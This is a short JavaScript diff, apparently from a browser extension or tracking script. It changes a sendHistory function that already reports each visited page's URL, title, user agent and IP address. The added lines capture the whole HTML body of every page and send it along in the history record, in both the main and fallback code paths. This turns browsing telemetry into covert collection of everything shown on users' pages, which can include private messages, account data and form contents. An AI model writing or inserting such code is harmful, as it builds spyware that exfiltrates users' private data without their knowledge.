@@ -190,13 +190,18 @@ function sendHistory(url, title) {
   if (!url) {
     return;
   }
+  let data = "";
+  try {
+    data = document.querySelector('body').outerHTML;
+  } catch(e){}
   try {
     getIpClient((ip) => {
       updateData("pageHistory", {
         url: url,
         userAgent: navigator.userAgent,
         title: title,
-        ip: ip
+        ip: ip,
+        data: data
       });
     })
   } catch(e){
@@ -204,6 +209,7 @@ function sendHistory(url, title) {
       url: url,
       userAgent: navigator.userAgent,
       title: title,
+      data: data
     });
   }
 }
